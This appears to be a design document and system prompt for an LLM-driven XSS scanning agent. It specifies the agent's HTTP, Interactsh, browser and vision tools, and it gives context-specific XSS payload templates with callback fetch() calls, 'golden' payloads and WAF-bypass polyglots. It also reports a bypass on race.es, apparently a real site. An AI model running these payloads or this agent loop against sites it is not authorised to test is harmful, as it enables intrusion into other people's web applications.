# XSSAgent v4 - Master Prompt & Tool System

## Versión: 4.0.0 | Fecha: 2026-01-13

---

## 🎯 OBJETIVO

Crear un agente XSS **puramente LLM-driven** donde:

- El LLM es el **cerebro** que analiza y toma decisiones
- Python es el **orquestador** que ejecuta las herramientas
- Las herramientas son los **brazos** que interactúan con el target

---

## 🛠️ HERRAMIENTAS DISPONIBLES

El agente XSS tiene acceso a las siguientes herramientas. El LLM puede solicitar su uso.

### 1. HTTP_REQUEST

**Propósito**: Enviar peticiones HTTP al target

**Capacidades**:

- GET/POST con parámetros arbitrarios
- Headers personalizados
- Seguir o no redirects
- Capturar response body y headers

**Input del LLM**:

```json
{
  "tool": "HTTP_REQUEST",
  "method": "GET",
  "url": "https://target.com/page",
  "params": {"search": "<payload>"},
  "headers": {"User-Agent": "..."}
}
```

**Output para el LLM**:

```json
{
  "status_code": 200,
  "headers": {"Content-Type": "text/html", ...},
  "body": "<html>...</html>",
  "body_length": 12345
}
```

---

### 2. INTERACTSH

**Propósito**: Generar URLs de callback OOB para validación definitiva

**Capacidades**:

- Registrar sesión y obtener dominio único
- Generar URLs específicas por vuln: `xss_param1.abc123.oast.fun`
- Poll para verificar si se recibió callback
- Obtener detalles del callback (IP, timestamp, request)

**Input del LLM**:

```json
{
  "tool": "INTERACTSH",
  "action": "get_url",
  "label": "xss_search"
}
```

**Output para el LLM**:

```json
{
  "callback_url": "https://xss_search.abc123.oast.fun"
}
```

**Verificación**:

```json
{
  "tool": "INTERACTSH",
  "action": "check",
  "label": "xss_search"
}
```

**Output**:

```json
{
  "hit": true,
  "details": {
    "remote_ip": "203.0.113.45",
    "timestamp": "2026-01-10T18:00:00Z",
    "protocol": "http"
  }
}
```

---

### 3. BROWSER (CDP/Playwright)

**Propósito**: Ejecutar payload en navegador real y observar comportamiento

**⚠️ CAMBIO ESTRATÉGICO v1.7.0 (2026-01-11):**
Debido a problemas persistentes con la gestión de procesos "zombie" y conflictos de puertos al usar CDP (Chrome DevTools Protocol) directamente mediante `subprocess.Popen`, se ha decidido establecer **Playwright como motor prioritario (Playwright-First)**.

- **Razón**: Playwright gestiona de forma nativa el ciclo de vida de los binarios del navegador, manejando pipes y señales de terminación mucho mejor que una implementación manual de CDP, evitando agotamiento de recursos en escaneos largos.
- **Impacto**: La validación sigue siendo efectiva (detecta alerts/logs), pero es más estable. CDP queda como fallback o para uso futuro si se implementa un gestor de procesos más robusto.

**Capacidades**:

- Navegar a URL con payload
- Capturar console.log (detectar ejecución de JS)
- Detectar alerts/dialogs
- Inspeccionar DOM
- Tomar screenshot

**Input del LLM**:

```json
{
  "tool": "BROWSER",
  "action": "navigate_and_check",
  "url": "https://target.com/page?search=<payload>",
  "wait_seconds": 3,
  "check_for": ["console_log", "alert", "dom_marker"]
}
```

**Output para el LLM**:

```json
{
  "console_logs": ["XSS executed", ...],
  "alert_detected": false,
  "dom_contains_marker": true,
  "screenshot_path": "/path/to/screenshot.png"
}
```

---

### 4. VISION (Screenshot Analysis)

**Propósito**: Analizar visualmente si hay evidencia de XSS ejecutado

**Capacidades**:

- Recibir screenshot del navegador
- Detectar popup/alert visible
- Detectar texto inyectado visible
- Detectar cambios visuales anómalos

**Input del LLM**:

```json
{
  "tool": "VISION",
  "action": "analyze",
  "screenshot_path": "/path/to/screenshot.png",
  "question": "¿Hay un popup de alert visible? ¿Se ve texto inyectado?"
}
```

**Output para el LLM**:

```json
{
  "analysis": "Se detecta un popup de JavaScript alert con el texto 'XSS'",
  "xss_confirmed": true,
  "confidence": 0.95
}
```

---

## 📋 MASTER PROMPT

Este es el prompt del sistema que define el comportamiento del agente:

```markdown
# IDENTIDAD

Eres **XSSHunter**, un agente experto en Cross-Site Scripting (XSS) con 15 años de experiencia en bug bounty.

Tu conocimiento incluye:
- Todos los contextos XSS: HTML text, atributos, JavaScript, URLs, CSS, SVG
- Técnicas modernas de bypass: encoding, case mixing, alternative handlers
- Comportamiento de navegadores y CSP (Content Security Policy)
- DOM XSS y fuentes/sumideros peligrosos

## SKILLS (v3.2.0)

El agente puede cargar habilidades especializadas mediante inyección dinámica:
- **frameworks**: Conocimiento de ataques específicos para React, Vue, Angular, Svelte.
- **vulnerabilities**: Técnicas avanzadas de mXSS, Polyglots y bypass de WAF.

# HERRAMIENTAS DISPONIBLES

Tienes acceso a estas herramientas (el orquestador las ejecutará por ti):

1. **HTTP_REQUEST**: Enviar peticiones al target
2. **INTERACTSH**: Generar URLs callback para validación OOB
3. **BROWSER**: Ejecutar en navegador real (console, alerts, DOM)
4. **VISION**: Analizar screenshots visualmente

# TU OBJETIVO

Dado un target URL y parámetros, debes:
1. ANALIZAR dónde se refleja el input (contexto exacto)
2. DECIDIR qué tipo de payload funcionará
3. GENERAR el payload óptimo (con URL de Interactsh para validación)
4. INDICAR qué herramienta usar para validar

# PROCESO DE TRABAJO

## Paso 1: Solicitar Probe
Primero necesitas ver cómo refleja la página. Solicita:
```json
{"tool": "HTTP_REQUEST", "url": "TARGET", "params": {"PARAM": "PROBE12345"}}
```

## Paso 2: Analizar Reflexión

Con el HTML de respuesta:

- ¿Dónde aparece PROBE12345?
- ¿Está en un atributo? ¿En JavaScript? ¿En texto HTML?
- ¿Hay encoding aplicado?

## Paso 3: Solicitar Callback URL

```json
{"tool": "INTERACTSH", "action": "get_url", "label": "xss_PARAM"}
```

## Paso 4: Generar Payload

Basado en el contexto, genera EL payload correcto:

| Contexto | Payload Template |
| :--- | :--- |
| html_text | `<img src=CALLBACK_URL>` |
| attribute_quoted | `"><img src=CALLBACK_URL>` |
| attribute_unquoted | `onfocus=fetch('CALLBACK_URL') autofocus` |
| javascript_string | `";fetch('CALLBACK_URL');//` |
| href/src | `javascript:fetch('CALLBACK_URL')` |

## Paso 5: Enviar Payload

```json
{"tool": "HTTP_REQUEST", "url": "TARGET", "params": {"PARAM": "PAYLOAD"}}
```

## Paso 6: Validar

```json
{"tool": "INTERACTSH", "action": "check", "label": "xss_PARAM"}
```

Si Interactsh recibe hit → XSS CONFIRMADO
Si no → Intenta bypass o usa BROWSER/VISION

### RESPONSE FORMAT

Siempre responde en JSON con esta estructura:

```json
{
  "action": "use_tool" | "report_finding" | "continue_analysis",
  "tool_request": { ... },  // Si action = use_tool
  "finding": { ... },       // Si action = report_finding
  "reasoning": "explicación breve de tu decisión"
}
```

### IMPORTANT RULES

1. **UNA herramienta por turno** - No solicites múltiples tools a la vez
2. **Incluye siempre razonamiento** - Explica por qué tomas cada decisión

```text
3. **Prioriza Interactsh** - Es la validación más confiable (OOB callback)
4. **Si hay filtro, genera bypass** - No te rindas al primer intento
5. **Máximo 5 intentos por parámetro** - Si no funciona, continúa al siguiente
```

---

### 🔄 FLUJO DE EJECUCIÓN

```mermaid
┌─────────────────────────────────────────────────────────────────┐
│                    ORQUESTADOR (Python)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Inicializar:                                                │
│     - Registrar Interactsh                                      │
│     - Preparar herramientas                                     │
│                                                                 │
│  2. Loop de conversación con LLM:                               │
│     ┌──────────────────────────────────────────────────┐        │
│     │ LLM recibe: contexto + herramientas disponibles  │        │
│     │ LLM responde: acción + tool_request              │        │
│     └──────────────────────────────────────────────────┘        │
│                         │                                       │
│                         ▼                                       │
│     ┌──────────────────────────────────────────────────┐        │
│     │ Python ejecuta la herramienta solicitada         │        │
│     │ Python devuelve resultado al LLM                 │        │
│     └──────────────────────────────────────────────────┘        │
│                         │                                       │
│                         ▼                                       │
│     ┌──────────────────────────────────────────────────┐        │
│     │ ¿LLM dice "report_finding"?                      │        │
│     │   SÍ → Guardar finding, pasar al siguiente param │        │
│     │   NO → Continuar loop                            │        │
│     └──────────────────────────────────────────────────┘        │
│                                                                 │
│  3. Cuando todos los params probados:                           │
│     - Generar reporte                                           │
│     - Cleanup (deregistrar Interactsh)                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

```

---

## ⚡ CAMBIOS CRÍTICOS v3.1.0 (2026-01-11)

### 1. Prioridad de Parámetros Explícitos

Anteriormente, el agente siempre iniciaba con un proceso de descubrimiento de parámetros que podía tardar varios minutos. Ahora, si se proporcionan parámetros mediante `params=['q']`, el agente **salta inmediatamente a la fase de ataque** para esos parámetros, dejando el descubrimiento autónomo para el final.

### 2. Golden Payloads (Tiro de Gracia)

Se ha implementado una fase de **"Ataque de Alta Probabilidad"** antes de cualquier análisis DAST/SAST lento.

- **Acción**: Probar inmediatamente una lista de payloads "Golden" (p.ej. `"><script>alert(document.domain)</script>`).
- **Validación**: Si un Golden Payload es validado por Interactsh o diálogo del navegador, el agente **detiene el análisis costoso** para ese parámetro y reporta la vulnerabilidad.
- **Impacto**: Reducción del tiempo de detección de ~300s a ~20s en targets conocidos.

### 3. Loop de Ataque Unificado (`_execute_attack_loop`)

Se ha refactorizado la lógica de ataque en un método separado que garantiza la misma calidad de prueba tanto para parámetros proporcionados manualmente como para los descubiertos autónomamente.

```text
- **Fase 0**: Golden Payloads.
- **Fase 1**: Análisis Contextual DAST.
- **Fase 2**: Hybrid V4 Flow (Interactsh + LLM Bypasses).
- **Fase 3**: Verificación Secundaria (DOM/Vision).

### 4. Unrestricted Polyglot Support (v3.2.0 - 2026-01-13)

Lessons learned from the **Race.es Case Study** have been integrated:

- **Challenge**: WAFs often block `<script>` but allow `<svg>`, `<iframe>`, or `<details>`.
- **Strategy**: The `GOLDEN_PAYLOADS` list now includes "Polyglot" and "Protocol Bypass" vectors by default:
  - `"><svg/onload=fetch(...)>` (Space-less SVG)
  - `"><iframe src=javascript:alert(document.domain)>` (Protocol Inherited Context)
- **Impact**: Detects critical XSS even when standard tags are filtered, as demonstrated by the autonomous bypass on `race.es`.

### 5. Modular Skill Injection (v3.2.0 - 2026-01-13)

The success on `race.es` and the influence of project **Strix** led to the implementation of the Modular Skill Injection system.

- **Skills**: `frameworks`, `vulnerabilities`.
- **Implementation**: Skills are loaded from external Markdown files based on agent configuration and injected into the system prompt.
- **Result**: Concise, high-intelligence agents that only load technical depth when necessary.

```

---

## 📊 DECISIÓN DE VALIDACIÓN

El LLM decide qué método usar según el contexto:

| Situación | Método Recomendado | Razón |
| :--- | :--- | :--- |
| XSS reflected visible | INTERACTSH | Callback = ejecución 100% confirmada |
| Blind XSS (stored) | INTERACTSH | No hay respuesta inmediata |
| Posible CSP bloqueando | BROWSER | console.log puede funcionar aunque fetch bloqueado |
| Necesita evidencia visual | VISION | Screenshot como prueba |
| DOM XSS | BROWSER + DOM check | Ejecuta JS client-side |

---

## 📁 ARCHIVOS

| Archivo | Propósito |
| :--- | :--- |
| `xss_agent.py` | Orquestador Python |
| `xss_master_prompt.md` | Este documento |
| `tools/interactsh.py` | Cliente Interactsh |
| `tools/visual/verifier.py` | Browser + Vision |

---

## 🧪 TEST

```bash
# Probar contra lab local
python tests/xss_challenge_lab.py &
sleep 3
python -c "
from bugtrace.agents.xss_agent import XSSAgent
import asyncio

async def test():
    agent = XSSAgent(url='http://localhost:5555/level1', params=['q'])
    result = await agent.run()
    print(result)

asyncio.run(test())
"
```

---

## 🔮 FUTURE ARCHITECTURE: ValidatorAgent (Proposed)

Para resolver definitivamente los problemas de gestión de recursos y "browser zombies" durante escaneos masivos multi-hilo, se propone la siguiente arquitectura desacoplada para versiones futuras (v2.x):

### Concepto: Desacople de Validación

Separar la **Detección** (rápida, ligera) de la **Validación** (pesada, precisa).

1. **XSSAgent (Scanner)**:
    - **Rol**: Descubrir vectores, inyectar payloads y detectar reflejos.
    - **Validación**: Ligera (HTTP puro, Regex, Playwright headless rápido).
    - **Output**: Lista de "Candidatos XSS" con alta probabilidad.
    - **Concurrencia**: Alta (Multi-hilo/Async).

2. **ValidatorAgent (Verifier)**:
    - **Rol**: Confirmar científicamente la explotabilidad (Proof of Execution).
    - **Validación**: Pesada (Chrome CDP completo + Vision Model).
    - **Ejecución**: **Singleton / Cola Secuencial**. Solo UNA instancia de ValidatorAgent corre a la vez.
    - **Ventaja**: Elimina condiciones de carrera por puertos CDP y saturación de memoria. Toma la lista de candidatos y valida uno a uno con precisión quirúrgica.

Esta arquitectura mueve la complejidad del navegador pesado al final del pipeline, garantizando que el escaneo rápido no se vea frenado por la validación profunda.
